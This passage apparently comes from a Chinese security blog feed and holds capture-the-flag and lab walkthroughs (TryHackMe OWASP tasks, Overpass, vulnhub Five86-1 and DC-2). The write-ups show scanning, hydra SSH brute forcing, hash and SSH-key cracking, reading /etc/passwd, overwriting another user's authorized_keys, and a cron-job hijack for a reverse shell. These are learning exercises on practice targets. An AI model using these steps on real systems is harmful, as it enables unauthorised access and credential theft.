Deserialization - Cookies</h1><h2 id="If-a-cookie-had-the-path-of-webapp-com-login-what-would-the-URL-that-the-user-has-to-visit-be"><a href="#If-a-cookie-had-the-path-of-webapp-com-login-what-would-the-URL-that-the-user-has-to-visit-be" class="headerlink" title="If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?"></a>If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?</h2><pre><code>webapp.com/login </code></pre><h2 id="What-is-the-acronym-for-the-web-technology-that-Secure-cookies-work-over"><a href="#What-is-the-acronym-for-the-web-technology-that-Secure-cookies-work-over" class="headerlink" title="What is the acronym for the web technology that Secure cookies work over?"></a>What is the acronym for the web technology that Secure cookies work over?</h2><pre><code>https</code></pre><h1 id="Task-25-Severity-8-Insecure-Deserialization-Cookies-Practical"><a href="#Task-25-Severity-8-Insecure-Deserialization-Cookies-Practical" class="headerlink" title="Task 25  [Severity 8] Insecure Deserialization - Cookies Practical"></a>Task 25  [Severity 8] Insecure Deserialization - Cookies Practical</h1><h2 id="1st-flag-cookie-value"><a href="#1st-flag-cookie-value" class="headerlink" title="1st flag (cookie value)"></a>1st flag (cookie value)</h2><p>注册一个账号，登录查看cookie，base64解密<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112224502778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h2 id="2nd-flag-admin-dashboard"><a href="#2nd-flag-admin-dashboard" class="headerlink" title="2nd flag (admin dashboard)"></a>2nd flag (admin dashboard)</h2><p>抓包改用户类型为admin<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112225050982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>有重定向<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112225126155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>THM{heres_the_admin_flag}</code></pre><h1 id="Task-26-Severity-8-Insecure-Deserialization-Code-Execution"><a href="#Task-26-Severity-8-Insecure-Deserialization-Code-Execution" class="headerlink" title="Task 26  [Severity 8] Insecure Deserialization - Code Execution"></a>Task 26  [Severity 8] Insecure Deserialization - Code Execution</h1><h2 id="flag-txt"><a href="#flag-txt" class="headerlink" title="flag.txt"></a>flag.txt</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112230518678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>4a69a7ff9fd68</code></pre><h1 id="Task-29-Severity-9-Components-With-Known-Vulnerabilities-Lab"><a href="#Task-29-Severity-9-Components-With-Known-Vulnerabilities-Lab" class="headerlink" title="Task 29  [Severity 9] Components With Known Vulnerabilities - Lab"></a>Task 29  [Severity 9] Components With Known Vulnerabilities - Lab</h1><h2 id="How-many-characters-are-in-etc-passwd-use-wc-c-etc-passwd-to-get-the-answer"><a href="#How-many-characters-are-in-etc-passwd-use-wc-c-etc-passwd-to-get-the-answer" class="headerlink" title="How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)"></a>How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)</h2><p>随便点商品，发现一个一个注入点：/bookPerPub.php?pubid=2<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112232842404.png#pic_center" alt=""><br>谷歌一波该漏洞<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112232930876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112233013980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112233143605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>1611</code></pre><h1 id="Task-30-Severity-10-Insufficient-Logging-and-Monitoring"><a href="#Task-30-Severity-10-Insufficient-Logging-and-Monitoring" class="headerlink" title="Task 30  [Severity 10] Insufficient Logging and Monitoring"></a>Task 30  [Severity 10] Insufficient Logging and Monitoring</h1><p>有登录尝试，为账号密码爆破<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201112234126912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h2 id="What-kind-of-attack-is-being-carried-out"><a href="#What-kind-of-attack-is-being-carried-out" class="headerlink" title="What kind of attack is being carried out?"></a>What kind of attack is being carried out?</h2><pre><code>brute force</code></pre><p><a href="http://mirrors.ren/" target="_blank" rel="noopener">个人博客，欢迎来踩~</a>.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tryhackme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnub-Five86-1</title>
      <link href="/posts/7wa8a2e8.html"/>
      <url>/posts/7wa8a2e8.html</url>
      
        <content type="html"><![CDATA[<p>靶机地址: <a href="https://www.vulnhub.com/entry/five86-1,417/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/five86-1,417/</a>.</p><h1 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h1><p>使用nmap对进行探测，得到靶机的ip</p><pre><code>nmap 192.168.88.0/24 -T4</code></pre><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601170350449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt="">再用nmap进行更详细的探测，发现以下三个端口以及对应的服务。</p><a id="more"></a>)<pre><code>nmap 192.168.88.136 -T4 -A -sV -p-</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601201517284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><p>22端口尝试着爆破，但无果。<br>访问靶机的80端口，一片空白。想起了nmap扫描到的robots.txt,对其访问发现存在一个目录</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601171425445.png" alt=""></p><h1 id="OpenNetAdmin"><a href="#OpenNetAdmin" class="headerlink" title="OpenNetAdmin"></a>OpenNetAdmin</h1><p>访问该目录跳转到OpenNetAdmin的管理页面，并且也爆出了版本号, 想了解的可自行百度。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601171814641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><p>接下来就在漏洞库查找也没有该版本的漏洞，发现刚好有一个对应版本的漏洞，并且在msf中也有可利用的exp。</p><pre><code>searchsploit OpenNetAdmin</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601172407635.png" alt="">设置好参数之后执行</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601172702741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt="">可以看到已经返回了shell</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601172824460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt="">查看所返回的shell的权限，发现并不是很高。在查看该主机有多少个用户<br>发现了五个用户，分别是moss、roy、jen、richmond、douglas</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601173113490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt="">进到/home目录，发现五个用户的/home目录都没权限进入<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601174203845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>最后在/var/www目录下发现douglas用户的hash密码文件。用kali自带的字典对其hash进行爆破发现行不通，但在下方也对密码进行了提示：密码长度是10，且包含aefhrt，使用crunch生成口令字典，再利用john进行爆破。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601175436888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><pre><code>crunch 10 10 aefhrt &gt; five1.txt</code></pre><p>结合之前得到的hash值，用john进行爆破</p><pre><code>echo 'douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1' &gt; test.txt</code></pre><p>最后爆出密码为：fatherrrrr<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601180230791.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601180115794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>使用帐号douglas登录靶机,发现douglas用户可以以jen的身份使用cp命令。这里可以使用linux主机免认证的方式将生成的key文件覆盖掉jen用户的key文件，达到登录jen用户的目的。</p><pre><code>cd .ssh/cp id_rsa.pub  /tmp/authorized_keyscd /tmp/sudo -u jen  cp authorized_keys /home/jen/.sshssh jen@192.168.88.136</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020060118091249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601193856602.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt="">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601194010438.png" alt="">登录成功发现有一个邮件,查看发现里面有moss的密码，并且登录也成功了。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020060119465844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt="">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601195228826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt="">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020060119531910.png" alt=""><br>登录成功之后在moss的家目录找到了一个只可行文件，并且有suid权限。看来这应该是拿root权限的组后一个方法。玩起这个游戏，最后拿到了root权限也拿到了最后的flag</p><pre><code>find / -type f -perm -u=s 2&gt;/dev/null</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601195838429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt="">)<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200601200128275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt="">记，第一次写博客。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tryhackme--Overpass</title>
      <link href="/posts/75a4a2e8.html"/>
      <url>/posts/75a4a2e8.html</url>
      
        <content type="html"><![CDATA[<h1 id="tryhackme–Overpass"><a href="#tryhackme–Overpass" class="headerlink" title="tryhackme–Overpass"></a>tryhackme–Overpass</h1><p>用nmap扫描主机，因为前面我已经简单扫过开放的端口了，所以我现在直接放上详细扫描的贴图和命令</p><pre><code>nmap -T4 -sS -sV 10.10.220.203 -sC -p 22,80</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116214150967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>扫描得到的目录<a id="more"></a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116214321594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>各种扫描，注入，爆破都试过了，也没有历史漏洞，看了wp才知道是js代码逻辑漏洞，这方面练的太少了，以至于没有找到切入点</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116214652188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><pre><code>async function login() {    const usernameBox = document.querySelector("#username");    const passwordBox = document.querySelector("#password");    const loginStatus = document.querySelector("#loginStatus");    loginStatus.textContent = ""    const creds = { username: usernameBox.value, password: passwordBox.value }    const response = await postData("/api/login", creds)    const statusOrCookie = await response.text()    if (statusOrCookie === "Incorrect credentials") {        loginStatus.textContent = "Incorrect Credentials"        passwordBox.value=""    } else {        Cookies.set("SessionToken",statusOrCookie)        window.location = "/admin"    }</code></pre><p>条件检查有效凭证。如果不正确，则输出“Incorrect Credentials”，但如果正确，则设置一个名为SessionToken的Cookie，并将用户重定向到/ admin，在这里他是根据服务端返回的状态码，也就是Incorrect Credentials判定的，我们可以利用burp来重发响应包，来欺骗前端js验证</p><p>接下来看操作<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116221959769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>转发，将得到的响应包删掉Incorrect Credentials再转发</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116222216429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116222233402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>然后刷新浏览器，看到James的ssh私钥<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116222432597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>j将ssh私钥保存到本地，就可以用James用户的ssh私钥免密登录，保存私钥的文件的权限一定要为600</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116223902810.png#pic_center" alt=""></p><p>在这里还需要一个密码，Paradox也说了忘记了自己爆破，kali中也有工具可以从ssh私钥中提取密码</p><pre><code>python /usr/share/john/ssh2john.py id_rsa &gt; id_rsa.hashjohn --wordlist=tools/dict/rockyou.txt id_rsa.hash</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116223507629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>登录</p><pre><code>ssh james@10.10.241.41 -i id_rsa</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116223958390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>找到user.txt</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116224129800.png#pic_center" alt=""><br>在定时任务找到一个有趣的东西，可以利用定时任务提权，以root的身份下载一个sh的文件并且执行</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116225920801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>修改/etc/hosts文件，将overpass.thm域名映射到我们kali的ip上，再在kali的web服务器上新建同样的目录以及文件，但不过文件的内容改为反弹shell的内容，这样一来，root权限，哦霍霍~~</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111623141655.png#pic_center" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201116231346209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>又是垃圾的一天</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115234345672.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tryhackme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-dc-2</title>
      <link href="/posts/7wa2a2e8.html"/>
      <url>/posts/7wa2a2e8.html</url>
      
        <content type="html"><![CDATA[<p>vulnhub第三个靶机</p><p>靶机地址：链接: <a href="https://www.vulnhub.com/entry/dc-2,311/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-2,311/</a>.</p><p>知识点</p><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><p>使用nmap扫描局域网内存活的主机，发现靶机ip</p><pre><code>nmap 192.168.88.0/24 -T4</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602081506156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>用nmap对其进行更详细的探测,发现开放了<a id="more"></a>)</p><table><thead><tr><th>端口</th><th>服务</th></tr></thead><tbody><tr><td>80</td><td>http</td></tr><tr><td>7744</td><td>ssh</td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602084417698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>端口：7744——&gt;爆破——&gt;失败</p><pre><code>hydra -l root -P rockyou.txt 192.168.88.138 ssh -t 4 -s 7744</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602085534236.png" alt=""></p><h1 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h1><p>端口：80——&gt;web漏洞——&gt;成功</p><p>访问80端口发现不能连接到该网站，需要设置一下hosts文件，便可访问</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602090902783.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200602090948854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>在右下方发现第一个flag，并且需要用到工具 <a href="https://www.codercto.com/a/44828.html" target="_blank" rel="noopener">cewl</a>.（kali自带）</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020060209112534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""><br>指纹识别为wordpress，该CMS为一款比较知名的博客CMS。对于该CMS，kali有自带的扫描工具<a href="https://www.jianshu.com/p/a0143cc79215" target="_blank" rel="noopener">wpscan</a>.</p><pre><code>whatweb http://dc-2</code></pre><p><img 